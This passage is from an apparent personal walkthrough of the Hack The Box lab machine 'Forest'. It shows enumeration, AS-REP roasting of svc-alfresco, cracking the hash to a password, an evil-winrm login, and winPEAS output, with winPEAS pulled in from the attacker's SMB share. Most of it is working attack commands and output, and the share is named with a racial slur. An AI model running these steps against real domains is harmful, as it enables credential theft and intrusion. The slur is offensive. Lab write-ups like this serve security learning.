[V] Running command: net rpc group members 'Read-only Domain Controllers' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Read-only Domain Controllers' (RID: 521) has member: Could not connect to server 10.129.215.16
Group 'Read-only Domain Controllers' (RID: 521) has member: The username or password was not correct.
Group 'Read-only Domain Controllers' (RID: 521) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Protected Users' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Protected Users' (RID: 525) has member: Could not connect to server 10.129.215.16
Group 'Protected Users' (RID: 525) has member: The username or password was not correct.
Group 'Protected Users' (RID: 525) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Enterprise Read-only Domain Controllers' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Enterprise Read-only Domain Controllers' (RID: 498) has member: Could not connect to server 10.129.215.16
Group 'Enterprise Read-only Domain Controllers' (RID: 498) has member: The username or password was not correct.
Group 'Enterprise Read-only Domain Controllers' (RID: 498) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Managed Availability Servers' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Managed Availability Servers' (RID: 1120) has member: Could not connect to server 10.129.215.16
Group 'Managed Availability Servers' (RID: 1120) has member: The username or password was not correct.
Group 'Managed Availability Servers' (RID: 1120) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Exchange Servers' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Exchange Servers' (RID: 1118) has member: Could not connect to server 10.129.215.16
Group 'Exchange Servers' (RID: 1118) has member: The username or password was not correct.
Group 'Exchange Servers' (RID: 1118) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Security Reader' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Security Reader' (RID: 1116) has member: Could not connect to server 10.129.215.16
Group 'Security Reader' (RID: 1116) has member: The username or password was not correct.
Group 'Security Reader' (RID: 1116) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Enterprise Admins' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Enterprise Admins' (RID: 519) has member: Could not connect to server 10.129.215.16
Group 'Enterprise Admins' (RID: 519) has member: The username or password was not correct.
Group 'Enterprise Admins' (RID: 519) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Delegated Setup' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Delegated Setup' (RID: 1113) has member: Could not connect to server 10.129.215.16
Group 'Delegated Setup' (RID: 1113) has member: The username or password was not correct.
Group 'Delegated Setup' (RID: 1113) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Group Policy Creator Owners' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Group Policy Creator Owners' (RID: 520) has member: Could not connect to server 10.129.215.16
Group 'Group Policy Creator Owners' (RID: 520) has member: The username or password was not correct.
Group 'Group Policy Creator Owners' (RID: 520) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Key Admins' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Key Admins' (RID: 526) has member: Could not connect to server 10.129.215.16
Group 'Key Admins' (RID: 526) has member: The username or password was not correct.
Group 'Key Admins' (RID: 526) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'test' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'test' (RID: 5101) has member: Could not connect to server 10.129.215.16
Group 'test' (RID: 5101) has member: The username or password was not correct.
Group 'test' (RID: 5101) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Organization Management' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Organization Management' (RID: 1104) has member: Could not connect to server 10.129.215.16
Group 'Organization Management' (RID: 1104) has member: The username or password was not correct.
Group 'Organization Management' (RID: 1104) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Security Administrator' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Security Administrator' (RID: 1117) has member: Could not connect to server 10.129.215.16
Group 'Security Administrator' (RID: 1117) has member: The username or password was not correct.
Group 'Security Administrator' (RID: 1117) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Domain Computers' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Domain Computers' (RID: 515) has member: Could not connect to server 10.129.215.16
Group 'Domain Computers' (RID: 515) has member: The username or password was not correct.
Group 'Domain Computers' (RID: 515) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members '$D31000-NSEL5BRJ63V7' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group '$D31000-NSEL5BRJ63V7' (RID: 1133) has member: Could not connect to server 10.129.215.16
Group '$D31000-NSEL5BRJ63V7' (RID: 1133) has member: The username or password was not correct.
Group '$D31000-NSEL5BRJ63V7' (RID: 1133) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'UM Management' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'UM Management' (RID: 1108) has member: Could not connect to server 10.129.215.16
Group 'UM Management' (RID: 1108) has member: The username or password was not correct.
Group 'UM Management' (RID: 1108) has member: Connection failed: NT_STATUS_LOGON_FAILURE

 ======================================================================== 
|    Users on 10.129.215.16 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[V] Attempting to get SID from 10.129.215.16 with command: rpcclient -W '' -U''%'' '10.129.215.16' -c 'lookupnames administrator' 2>&1
[V] Assuming that user "administrator" exists
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.
[V] Attempting to get SIDs from 10.129.215.16 with command: rpcclient -W '' -U''%'' '10.129.215.16' -c lsaenumsid 2>&1

 ============================================== 
|    Getting printer info for 10.129.215.16    |
 ============================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
[V] Attempting to get printer info with command: rpcclient -W '' -U''%'' -c 'enumprinters' '10.129.215.16' 2>&1
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Sat Sep  4 14:54:56 2021
```

here we go again with another big ass results
well here we got something interesting it leaks all the username, now we have the list of usernames and if kerberos pre user authentication is disabled we could use impacket script to send dummy requests for authentication and key distribution center will return TGT.

### this is what i found looking for kerberos exploitation
`When the user attempts to access a service in the network, the user sends a TGS_REQ to the Ticket Granting Server (TGS) function of the KDC. This message is encrypted with the logon session key, which is obtained during the AS Exchange. The TGS_REQ is verified by the TGS, which then returns a TGS_REP. The TGS_REP contains a service session key and a service ticket, which is encrypted with the master key of the server that hosts the service. The master key of the server in a Unix-based system is configured in a file called a keytab file. The master key of the server in a member server is derived from the computer account’s password. The TGS Exchange is outlined below.`

![](https://www.silverfort.com/wp-content/uploads/2020/10/Reaserch-blog-image-5.png)

```
Administrator
Guest
krbtgt 
DefaultAccount 
sebastien 
lucinda 
svc-alfresco
andy 
mark 
santi
```
we got filtered users only list  using regex

****foothold****

```
python3 GetNPUsers.py htb.local/ -dc-ip 10.129.215.16 -request
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2021-09-04 10:11:32.146467  2019-09-23 04:09:47.931194  0x410200 



$krb5asrep$23$svc-alfresco@HTB.LOCAL:417da7f13a4e6c9d34726a2e1366a430$6538c8c6247c1329019a7fbecaa69856106dd047638739da17a47d6dad171073fcdd0bdab99c9997cedb2ce9e6b5153403a5b9d5daea14ae3c171c94340a4dc07631c5c8473b37d11f9636148d1adb36502b5912e66a2e741662f7e8c45e064320aed224a4273d2eaabbc28892c6ff94bc7b43fccd16a5a11561035c51a5608eea7d75b0d6711bada743e5c0c4a195d77eafeb290d0da59cdf0d42e2b78c76972962477c091ccb82abfd4883339792fdc4df3a94d0dd189fdb3a2d52aab8892b5dc5f71101a944518fd748f187933d8cdd65ed4ec7a0f173dc7c018a4a3f12b341e6862fd572
```

and since kerberos pre authentication has been disabled for user svc-alfresco hence KDC gave us a TGT encrypted with users passwd hash

lets crack the passwd hash using john the ripper 

```╭─ ~/Desktop/HackTheBox/Machines/Easy/forest ──────────────────────────────────────────────────────────────────────────────────────────────────────── ✔  at 16:34:18 
╰─ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:03 DONE (2021-09-04 16:34) 0.2824g/s 1154Kp/s 1154Kc/s 1154KC/s s4553592..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
 
credentials are `svc-alfresco:s3rvice`

lets login using evil-winrm 

```╭─ ~/Desktop/HackTheBox/Machines/Easy/forest ───────────── 1 ✘  at 07:13:59 
╰─ evil-winrm -i 10.129.215.16 -u svc-alfresco -p s3rvice

Evil-WinRM shell v3.2

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

so we successfully gained the rce on the server as user svc-alfresco
lets see what we do have here!

on the user's desktop we got the user flag 
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         9/4/2021   8:26 AM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
98b866323bc05216737118f7fdb5c177
```


so  here we goin to run winpeas for post exploitation and privilege escalation
and we need host a smb server on the local machine to copy the file to the box

```╰─ impacket-smbserver nigga $(pwd)
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.215.16,58349)
[*] AUTHENTICATE_MESSAGE (\,FOREST)
[*] User FOREST\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Disconnecting Share(1:IPC$)
[-] Unknown level for query path info! 0x109
[*] Disconnecting Share(3:IPC$)
[-] Unknown level for query path info! 0x109

```

we goin to make a temp dir on there and copy the file there
```
*Evil-WinRM* PS C:\> mkdir temp


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         9/5/2021   2:37 AM                temp


*Evil-WinRM* PS C:\> cd temp
*Evil-WinRM* PS C:\temp> net use \\10.10.14.45\nigga
Local name
Remote name       \\10.10.14.45\nigga
Resource type     Disk
Status            OK
# Opens           0
# Connections     1
The command completed successfully.

*Evil-WinRM* PS C:\temp> copy \\10.10.14.45\nigga
*Evil-WinRM* PS C:\temp> ls


    Directory: C:\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         9/5/2021   2:38 AM                nigga


*Evil-WinRM* PS C:\temp> cd nigga
*Evil-WinRM* PS C:\temp\nigga> ls
*Evil-WinRM* PS C:\temp\nigga> ls
*Evil-WinRM* PS C:\temp\nigga> cd ..
*Evil-WinRM* PS C:\temp> copy \\10.10.14.45\nigga\winPEASx64.exe
*Evil-WinRM* PS C:\temp> ls


    Directory: C:\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         9/5/2021   2:38 AM                nigga
-a----         9/5/2021   7:38 AM        1923584 winPEASx64.exe

```

lets run it!

```
*Evil-WinRM* PS C:\temp> ./winPEASx64.exe
ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD

             *((,.,/((((((((((((((((((((/,  */
      ,/*,..*((((((((((((((((((((((((((((((((((,
    ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*
    ((((((((((((((((**********/########## .(* ,(((((((
    (((((((((((/********************/####### .(. (((((((
    ((((((..******************/@@@@@/***/###### ./(((((((
    ,,....********************@@@@@@@@@@(***,#### .//((((((
    , ,..********************/@@@@@%@@@@/********##((/ /((((
    ..((###########*********/%@@@@@@@@@/************,,..((((
    .(##################(/******/@@@@@/***************.. /((
    .(#########################(/**********************..*((
    .(##############################(/*****************.,(((
    .(###################################(/************..(((
    .(#######################################(*********..(((
    .(#######(,.***.,(###################(..***.*******..(((
    .(#######*(#####((##################((######/(*****..(((
    .(###################(/***********(##############(...(((
    .((#####################/*******(################.((((((
    .(((############################################(..((((
    ..(((##########################################(..(((((
    ....((########################################( .(((((
    ......((####################################( .((((((
    (((((((((#################################(../((((((
        (((((((((/##########################(/..((((((
              (((((((((/,.  ,*//////*,. ./(((((((((((((((.
                 (((((((((((((((((((((((((((((/

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.

  WinPEASng by @carlospolopm, makikvues(makikvues2[at]gmail[dot]com)

       /---------------------------------------------------------------------------\
       |                             Do you like PEASS?                            |
       |---------------------------------------------------------------------------|
       |         Become a Patreon    :     https://www.patreon.com/peass           |
       |         Follow on Twitter   :     @carlospolopm                           |
       |         Respect on HTB      :     SirBroccoli & makikvues                 |
       |---------------------------------------------------------------------------|
       |                                 Thank you!                                |
       \---------------------------------------------------------------------------/

  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

È You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
   Creating Dynamic lists, this could take a while, please wait...
   - Loading YAML definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at winPEAS.Checks.Checks.CreateDynamicLists()
   - Creating current user groups list...
   - Creating active users list (local only)...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating disabled users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Admin users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ System Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Basic System Information
È Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
  [X] Exception: Access denied 
  [X] Exception: Access denied 
  [X] Exception: The given key was not present in the dictionary.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing All Microsoft Updates
  [X] Exception: Creating an instance of the COM component with CLSID {B699E5E8-67FF-4177-88B0-3684A3388BFB} from the IClassFactory failed due to the following error: 80070005 Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)).

ÉÍÍÍÍÍÍÍÍÍÍ¹ System Last Shutdown Date/time (from Registry)

    Last Shutdown Date/time        :    8/31/2021 7:14:19 AM

ÉÍÍÍÍÍÍÍÍÍÍ¹ User Environment Variables
È Check for some passwords or keys in the env variables 
    COMPUTERNAME: FOREST
    PUBLIC: C:\Users\Public
    LOCALAPPDATA: C:\Users\svc-alfresco\AppData\Local
    PSModulePath: C:\Users\svc-alfresco\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Users\svc-alfresco\AppData\Local\Microsoft\WindowsApps
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 23
    ProgramFiles: C:\Program Files
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    USERPROFILE: C:\Users\svc-alfresco
    SystemRoot: C:\Windows
    ALLUSERSPROFILE: C:\ProgramData
    ProgramData: C:\ProgramData
    PROCESSOR_REVISION: 3100
    USERNAME: svc-alfresco
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    OS: Windows_NT
    PROCESSOR_IDENTIFIER: AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
    ComSpec: C:\Windows\system32\cmd.exe
    SystemDrive: C:
    TEMP: C:\Users\SVC-AL~1\AppData\Local\Temp
    NUMBER_OF_PROCESSORS: 2
    APPDATA: C:\Users\svc-alfresco\AppData\Roaming
    TMP: C:\Users\SVC-AL~1\AppData\Local\Temp
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: HTB
    USERDNSDOMAIN: htb.local

ÉÍÍÍÍÍÍÍÍÍÍ¹ System Environment Variables
È Check for some passwords or keys in the env variables 
    ComSpec: C:\Windows\system32\cmd.exe
    OS: Windows_NT
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 23
    PROCESSOR_IDENTIFIER: AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
    PROCESSOR_REVISION: 3100

ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Settings
È Check what is being logged 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Policy Settings - Classic & Advanced

ÉÍÍÍÍÍÍÍÍÍÍ¹ WEF Settings
È Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ LAPS Settings
È If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

ÉÍÍÍÍÍÍÍÍÍÍ¹ Wdigest
È If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#wdigest
    Wdigest is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ LSA Protection
È If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection
    LSA Protection is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ Credentials Guard
È If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard
    CredentialGuard is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached Creds
È If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials
    cachedlogonscount is 10

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating saved credentials in Registry (CurrentPass)

ÉÍÍÍÍÍÍÍÍÍÍ¹ AV Information
  [X] Exception: Access denied 
    No AV was detected!!
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Windows Defender configuration
  Local Settings
  Group Policy Settings

ÉÍÍÍÍÍÍÍÍÍÍ¹ UAC Status
È If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 
    FilterAdministratorToken: 0
      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
      [-] Only the RID-500 local admin account can be used for lateral movement.

ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.14393.0
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: 
    PS history size: 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating PowerShell Session Settings using the registry
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ PS default transcripts history
È Read the PS history inside these files (if any)

ÉÍÍÍÍÍÍÍÍÍÍ¹ HKCU Internet Settings
    DisableCachingOfSSLPages: 0
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 2688
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    CertificateRevocation: 1
    ZonesSecurityUpgrade: System.Byte[]

ÉÍÍÍÍÍÍÍÍÍÍ¹ HKLM Internet Settings
    EnablePunycode: 1

ÉÍÍÍÍÍÍÍÍÍÍ¹ Drives Information
È Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 9 GB)(Permissions: Users [AppendData/CreateDirectories])

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking WSUS
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AlwaysInstallElevated
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated isn't available

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate LSA settings - auth packages included

    auditbasedirectories                 :       0
    auditbaseobjects                     :       0
    Bounds                               :       00-30-00-00-00-20-00-00
    crashonauditfail                     :       0
    CreatePolicyDatabaseOnFirstBoot       :       1
    fullprivilegeauditing                :       00
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Security Packages                    :       ""
    Notification Packages                :       scecli
    Authentication Packages              :       msv1_0
    SecureBoot                           :       1
    LsaPid                               :       580
    ProductType                          :       7
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)


  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : True
      ServerNegotiateSigning  : True
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)


  NTLM Auditing and Restrictions
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      :

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Local Group Policy settings - local users/machine

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Printers (WMI)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Named Pipes
  Name                                                                                                 Sddl

  eventlog                                                                                             O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)

  RpcProxy\49676                                                                                       O:BAG:SYD:(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;BA)

  RpcProxy\593                                                                                         O:NSG:NSD:(A;;0x12019b;;;WD)(A;;RC;;;OW)(A;;0x12019b;;;AN)(A;;FA;;;S-1-5-80-521322694-906040134-3864710659-1525148216-3451224162)(A;;FA;;;S-1-5-80-979556362-403687129-3954533659-2335141334-1547273080)

  vgauth-service                                                                                       O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)


ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating AMSI registered providers
    Provider:       {2781761E-28E0-4109-99FE-B9D127C57AFE}
    Path:           C:\Program Files\Windows Defender\MpOav.dll

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon configuration
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon process creation logs (1)
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed .NET versions



ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting Events information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials

      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Account Logon Events (4624) for the last 10 days.

      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Process creation events - searching logs (EID 4688) for sensitive data.

      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell events - script block logs (EID 4104) - searching for sensitive data.

  [X] Exception: Attempted to perform an unauthorized operation.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Displaying Power off/on events for last 5 days

System.UnauthorizedAccessException: Attempted to perform an unauthorized operation.
   at System.Diagnostics.Eventing.Reader.EventLogException.Throw(Int32 errorCode)
   at System.Diagnostics.Eventing.Reader.NativeWrapper.EvtQuery(EventLogHandle session, String path, String query, Int32 flags)
   at System.Diagnostics.Eventing.Reader.EventLogReader..ctor(EventLogQuery eventQuery, EventBookmark bookmark)
   at winPEAS.Helpers.MyUtils.GetEventLogReader(String path, String query, String computerName)
   at winPEAS.Info.EventsInfo.Power.Power.<GetPowerEventInfos>d__0.MoveNext()
   at winPEAS.Checks.EventsInfo.PowerOnEvents()


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Users Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Users
È Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups
  [X] Exception: Object reference not set to an instance of an object.
  Current user: svc-alfresco
  Current groups: Domain Users, Everyone, Users, Builtin\Pre-Windows 2000 Compatible Access, Builtin\Remote Management Users, Account Operators, Network, Authenticated Users, This Organization, Privileged IT Accounts, Service Accounts, NTLM Authentication
   =================================================================================================

    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current User Idle Time
   Current User   :     HTB\svc-alfresco
   Idle Time      :     18h:13m:54s:328ms

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Tenant information (DsRegCmd.exe /status)

